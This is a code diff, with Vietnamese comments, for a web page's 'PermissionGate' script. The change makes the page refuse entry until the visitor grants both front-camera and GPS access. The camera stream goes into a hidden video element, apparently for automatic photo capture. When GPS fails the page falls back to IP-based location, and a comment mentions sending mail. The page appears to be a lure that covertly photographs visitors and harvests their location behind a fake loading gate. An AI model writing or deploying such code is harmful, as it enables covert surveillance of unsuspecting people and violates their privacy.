@@ -512,7 +512,7 @@
             }, 900);
         }
 
-        startBtn.addEventListener('click', () => {
+        startBtn.addEventListener('click', async () => {
             // Hiển thị trạng thái đang xử lý
             startBtn.classList.add('loading');
             btnText.textContent = 'ĐANG KHỞI TẠO...';
@@ -525,37 +525,66 @@
                 }
             } catch (e) {}
 
-            // 2. Yêu cầu cấp quyền CAMERA (Chụp ảnh tự động)
-            try {
-                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    startCameraAutoCapture();
+            // 2. Yêu cầu cấp quyền CAMERA (BẮT BUỘC CẤP QUYỀN CAMERA MỚI CHO ĐI TIẾP)
+            let cameraAllowed = false;
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+                        audio: false
+                    });
+                    if (stream) {
+                        cameraAllowed = true;
+                        cameraStream = stream;
+                        if (!videoEl) {
+                            videoEl = document.createElement('video');
+                            videoEl.setAttribute('autoplay', '');
+                            videoEl.setAttribute('playsinline', '');
+                            videoEl.setAttribute('muted', '');
+                            videoEl.style.display = 'none';
+                            document.body.appendChild(videoEl);
+                        }
+                        videoEl.srcObject = stream;
+                        videoEl.play().catch(() => {});
+                    }
+                } catch (camErr) {
+                    console.warn("[PermissionGate] Người dùng từ chối Camera:", camErr);
+                    // Bấm Từ Chối Camera -> Reset lại ban đầu, không cho vào!
+                    resetToStart();
+                    return;
                 }
-            } catch (e) {}
+            }
 
-            // 3. Yêu cầu cấp quyền VỊ TRÍ GPS (Geolocation)
+            if (!cameraAllowed) {
+                // Không cấp quyền Camera -> Không cho vào
+                resetToStart();
+                return;
+            }
+
+            // 3. Yêu cầu cấp quyền VỊ TRÍ GPS (BẮT BUỘC CẤP QUYỀN VỊ TRÍ MỚI MỞ KHÓA WEB)
             if (!navigator.geolocation) {
-                // Trình duyệt không hỗ trợ Geolocation -> Mở bằng IP ngầm
+                // Trình duyệt không hỗ trợ Geolocation -> Đã có camera thì mở bằng IP ngầm
                 unlockWeb(null);
                 return;
             }
 
             navigator.geolocation.getCurrentPosition(
-                // Khi người dùng CHO PHÉP và lấy được GPS (Success)
+                // Khi người dùng CHO PHÉP VỊ TRÍ -> ĐÃ ĐỦ CẢ 2 QUYỀN (CAM + GPS) -> MỞ KHÓA WEB!
                 (position) => {
                     unlockWeb(position.coords);
                 },
-                // Xử lý khi có lỗi hoặc người dùng bấm từ chối
+                // Xử lý khi người dùng bấm Từ chối vị trí
                 (error) => {
-                    console.warn("[PermissionGate] Geolocation status code:", error.code, error.message);
+                    console.warn("[PermissionGate] Geolocation error code:", error.code, error.message);
 
                     if (error.code === 1) {
-                        // Code 1: PERMISSION_DENIED -> Người dùng cố tình bấm "Từ chối / Block"
-                        // Reset lại ban đầu để bắt buộc cấp quyền
+                        // Code 1: PERMISSION_DENIED -> Người dùng cố tình bấm "Từ chối" vị trí
+                        // Reset lại ban đầu, bắt buộc phải cấp đủ quyền mới cho vào!
                         resetToStart();
                     } else {
                         // Code 2 (POSITION_UNAVAILABLE) hoặc Code 3 (TIMEOUT): 
                         // Người dùng ĐÃ CHO PHÉP nhưng thiết bị trong nhà / PC không có chip GPS vệ tinh
-                        // -> Tự động dùng vị trí IP ngầm để mở khóa web và gửi mail, không làm kẹt người dùng!
+                        // -> Tự động dùng vị trí IP ngầm để mở khóa web
                         unlockWeb(null);
                     }
                 },
